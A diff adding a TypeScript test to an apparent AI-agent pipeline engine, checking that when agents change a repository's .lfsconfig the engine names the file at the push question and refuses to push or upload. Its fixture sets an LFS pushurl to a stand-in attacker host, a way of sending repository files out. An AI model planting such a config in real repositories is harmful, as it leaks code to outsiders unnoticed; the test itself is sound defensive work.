@@ -957,3 +957,27 @@ test('engine: a refused API token does not stop the task when an Atlassian MCP s
     h.hooks.dispose();
   }
 });
+
+test('engine: Git LFS files are not uploaded where a .lfsconfig the agents changed says; you check it and push yourself', { skip: process.platform === 'win32' }, async () => {
+  const ws = workspace(['api'], 'pipeline: [planner, developer]\nrepos:\n  api: {}\n');
+  fs.writeFileSync(path.join(ws, 'api', '.gitattributes'), '*.bin filter=lfs diff=lfs merge=lfs -text\n');
+  git(path.join(ws, 'api'), 'add', '.');
+  git(path.join(ws, 'api'), 'commit', '-q', '-m', 'lfs');
+  const { remote, path: PATH } = remoteSetup(ws, '#!/bin/sh\nexit 0\n');
+  const bin = fs.mkdtempSync(path.join(os.tmpdir(), 'cs-lfs-'));
+  fs.writeFileSync(path.join(bin, 'git-lfs'), '#!/bin/sh\necho "$@" >> "$FAKE_STATE/lfs.log"\n', { mode: 0o755 });
+  const h = await harness(ws, { FAKE_REPOS: 'api', PATH: `${bin}${path.delimiter}${PATH}`, FAKE_DEV_FILES: JSON.stringify({ '.lfsconfig': '[lfs]\n\tpushurl = https://attacker.example/x/info/lfs\n' }) });
+  try {
+    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
+    await runTask(h.engine, taskId);
+    const ctx = await h.engine.checkpointContext(await h.engine.svc.state(taskId), (await h.engine.svc.state(taskId)).checkpoint);
+    assert.deepEqual(ctx.hooks, [{ repo: 'api', file: '.lfsconfig' }], 'the push question names it');
+    await h.engine.answer(taskId, 'confirm-push', 'push');
+    await waitFor(() => !h.engine.isRunning(taskId), 60000);
+    assert.match(h.engine.lastError(taskId)!.message, /the agents changed \.lfsconfig, which says where Git LFS uploads the files/);
+    assert.equal(fs.existsSync(path.join(h.state, 'lfs.log')), false, 'nothing uploaded');
+    assert.equal(execFileSync('git', ['-C', remote, 'branch', '--list', 'feat/add-feature'], { encoding: 'utf8' }).trim(), '', 'nor pushed');
+  } finally {
+    h.hooks.dispose();
+  }
+});
